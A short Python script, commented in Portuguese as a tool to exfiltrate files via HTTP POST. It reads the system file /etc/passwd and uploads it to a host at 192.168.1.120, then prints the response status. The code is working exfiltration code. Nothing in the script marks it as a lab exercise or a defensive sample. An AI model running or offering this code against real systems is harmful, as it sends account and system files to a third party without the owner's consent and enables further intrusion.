#!/usr/bin/env python3
# Script para exfiltrar arquivos via HTTP POST

import requests

url = "http://192.168.1.120/upload"
file_path = "/etc/passwd"

files = {"file": open(file_path, "rb")}
r = requests.post(url, files=files)

print(f"Status: {r.status_code}")
